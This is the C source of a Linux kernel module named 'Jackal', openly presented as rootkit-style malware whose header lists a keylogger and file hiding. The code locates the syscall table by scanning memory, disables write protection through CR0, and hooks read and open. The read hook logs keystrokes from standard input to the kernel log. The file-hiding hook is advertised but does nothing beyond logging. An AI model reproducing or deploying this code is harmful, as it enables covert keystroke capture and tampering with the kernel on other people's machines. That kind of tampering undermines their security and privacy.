#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>
#include <linux/delay.h>
#include <asm/paravirt.h>

/*   _            _         _ 
    | | __ _  ___| | ____ _| |
 _  | |/ _` |/ __| |/ / _` | |
| |_| | (_| | (__|   < (_| | |
 \___/ \__,_|\___|_|\_\__,_|_|
                          
https://data.whicdn.com/images/78048685/large.gif

Features:
    keylogger
    hide file
*/

MODULE_LICENSE( "GPL" );

static char *file_to_hide = "blah";

module_param( file_to_hide, charp, 0 );
MODULE_PARM_DESC( file_to_hide, "file to hide" );

unsigned long **sys_call_table;
unsigned long original_cr0;

/* preserve the original sys_calls so we can refere to it when unloading the module */
asmlinkage long ( *ref_sys_read )( unsigned int fd, char __user *buf, size_t count );
asmlinkage long ( *ref_sys_open )( const char *pathname, int flags, mode_t mode );

/* intercept open */
asmlinkage long new_sys_open( const char *pathname, int flags, mode_t mode ) {
    long ret;
    ret = ref_sys_open( pathname, flags, mode );

    printk( KERN_INFO " |- Intercepted sys_open" );

    return ref_sys_open( pathname, flags, mode );
}

/* intercept read */
asmlinkage long new_sys_read( unsigned int fd, char __user *buf, size_t count ) {
    long ret;
    ret = ref_sys_read( fd, buf, count );

    if( count == 1 && fd == 0 )
        printk( KERN_INFO " |- Intercepted sys_read: %X", buf[0] );

    return ret;
}

static unsigned long **aquire_sys_call_table( void ) {
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    while ( offset < ULLONG_MAX ) {
        sct = ( unsigned long ** )offset;

        if ( sct[__NR_close] == ( unsigned long * ) sys_close ) 
            return sct;

        offset += sizeof( void * );
    }

    return NULL;
}

static int __init jackle_start( void ) {
    
    printk( KERN_INFO "[+]  J A C K A L\n" );
    if( !( sys_call_table = aquire_sys_call_table() ) )
        return -1;
    original_cr0 = read_cr0();
    printk( KERN_INFO " |- Aquired sys_call_table\n" );

    write_cr0( original_cr0 & ~0x00010000 );
    printk( KERN_INFO " |- Unlocked table!!\n" );

    ref_sys_read = ( void * )sys_call_table[__NR_read];
    ref_sys_open = ( void * )sys_call_table[__NR_open];

    sys_call_table[__NR_read] = ( unsigned long * )new_sys_read;
    printk( KERN_INFO " |- Patched sys_read\n" );
    sys_call_table[__NR_open] = ( unsigned long * )new_sys_open;
    printk( KERN_INFO " |- Patched sys_open\n" );
    printk( KERN_INFO " |  ` hiding %s\n", file_to_hide );
    write_cr0( original_cr0 );

    return 0;
}

static void __exit jackle_end( void ) {
    if( !sys_call_table ) {
        return;
    }

    write_cr0( original_cr0 & ~0x00010000 );
    sys_call_table[__NR_read] = ( unsigned long * )ref_sys_read;
    sys_call_table[__NR_open] = ( unsigned long * )ref_sys_open;
    write_cr0( original_cr0 );

}

module_init( jackle_start );
module_exit( jackle_end );
